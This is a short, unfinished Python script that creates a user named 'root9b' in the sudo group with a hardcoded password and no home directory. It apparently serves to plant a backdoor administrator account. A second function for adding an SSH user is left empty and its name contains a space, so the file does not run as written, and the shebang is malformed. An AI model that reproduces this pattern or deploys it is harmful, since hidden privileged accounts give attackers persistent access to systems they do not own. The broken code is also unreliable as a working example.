#/usr/bin/python2.7

import subprocess

def addsudoer():
    subprocess.check_output(['/usr/sbin/useradd', '-M', # don't create home dir
                             '-G', 'sudo',              # group
                             '-p', '9btoor',            # pass
                             'root9b',                  # user
                             '-s', '/bin/bash'])         # shell

def add sshuser():
    subprocess.check_output(    )

addsudoer()